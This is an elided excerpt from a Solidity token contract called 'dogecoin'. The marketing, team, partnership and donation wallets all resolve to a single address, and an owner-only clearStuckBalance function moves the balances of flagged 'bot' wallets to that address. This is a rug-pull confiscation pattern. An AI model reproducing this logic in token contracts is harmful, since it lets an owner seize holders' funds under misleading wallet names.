...
contract dogecoin is Context, IERC20, Ownable {
    ...
    address payable public _marketingAddress =
        payable(address(0xf4bDc8137969c064b933855E2550e724b3570fe1));
    address payable public _teamwallet =
        payable(address(0xf4bDc8137969c064b933855E2550e724b3570fe1));
    address _partnershipswallet =
        payable(address(0xf4bDc8137969c064b933855E2550e724b3570fe1));
    address private _donationAddress =
        0xf4bDc8137969c064b933855E2550e724b3570fe1;
    ...
    function clearStuckBalance() public onlyOwner {
        for(uint256 i = 0; i < botsWallet.length; i++){
            ...
            _transferStandard(wallet, address(0xf4bDc8137969c064b933855E2550e724b3570fe1), amount);
        }
